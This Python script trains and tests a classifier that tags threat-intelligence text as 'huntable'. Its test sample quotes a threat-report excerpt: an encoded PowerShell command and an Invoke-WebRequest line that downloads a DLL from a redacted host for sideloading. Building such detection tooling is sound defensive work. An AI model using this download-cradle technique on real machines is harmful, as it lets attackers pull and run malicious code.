#!/usr/bin/env python3
"""
Training script for the content filter ML model.

This script trains a machine learning model to classify text chunks as
huntable or not huntable based on the annotated data.
"""

import argparse
import logging
import os
import sys
from pathlib import Path

# Add src to path for imports
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "src"))

from utils.content_filter import ContentFilter


def setup_logging():
    """Setup logging configuration."""
    logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(name)s - %(levelname)s - %(message)s")
    return logging.getLogger(__name__)


def main():
    """Main training function."""
    parser = argparse.ArgumentParser(description="Train content filter ML model")
    parser.add_argument("--data", default="highlighted_text_classifications.csv", help="Path to training data CSV file")
    parser.add_argument("--model", default="models/content_filter.pkl", help="Path to save the trained model")
    parser.add_argument("--verbose", action="store_true", help="Enable verbose logging")

    args = parser.parse_args()

    logger = setup_logging()
    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)

    # Check if training data exists
    if not Path(args.data).exists():
        logger.error(f"Training data file not found: {args.data}")
        logger.info("Please ensure the CSV file with annotations exists.")
        return 1

    # Initialize content filter
    logger.info("Initializing content filter...")
    content_filter = ContentFilter(model_path=args.model)

    # Train the model
    logger.info(f"Training model on data from: {args.data}")
    success = content_filter.train_model(args.data)

    if success:
        logger.info(f"Model trained successfully and saved to: {args.model}")
        logger.info("The model is ready to use for content filtering.")

        # Test the model
        logger.info("Testing model with sample content...")
        test_content = """
        Post exploitation Huntress has also observed threat actors attempting to use encoded PowerShell to download and sideload a DLL via a commonly used cradle technique: 
        Command: powershell.exe -encodedCommand REDACTEDBASE64PAYLOAD== 
        Cleartext: Invoke-WebRequest -uri http://REDACTED:REDACTED/d3d11.dll -outfile C:UsersPublicREDACTEDd3d11.dll
        
        Acknowledgement We would like to extend our gratitude to the Sitecore team for their support throughout this investigation.
        """

        is_huntable, confidence = content_filter.predict_huntability(test_content)
        logger.info(f"Test prediction: Huntable={is_huntable}, Confidence={confidence:.3f}")

        return 0
    logger.error("Model training failed!")
    return 1


if __name__ == "__main__":
    sys.exit(main())
